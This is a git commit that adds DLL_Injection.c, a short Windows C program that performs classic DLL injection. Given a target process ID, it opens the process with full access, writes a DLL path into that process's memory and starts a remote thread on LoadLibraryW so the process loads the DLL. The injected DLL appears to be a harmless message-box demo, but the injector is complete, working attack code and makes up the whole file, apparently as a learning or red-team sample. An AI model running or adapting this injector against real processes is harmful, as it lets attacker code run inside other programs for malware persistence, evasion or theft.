12025c80a2cae31ce58b502e8711164163fe90a9
shiftsansan <104987706+shiftsansan@users.noreply.github.com>
2022-08-04 02:07:23 -0700

    Create DLL_Injection.c

---
+++ DLL_Injection.c
@@ -0,0 +1,19 @@
+#include <stdlib.h>
+#include <iostream>
+#include <Windows.h>
+
+int main(int argc, char* argv[]) {
+	HANDLE processHandle;
+	PVOID remoteBuffer;
+	wchar_t dllPath[] = TEXT("MessageBox_DLL.dll");
+
+	printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
+	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
+	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
+	CloseHandle(processHandle);
+
+	return 0;
+}
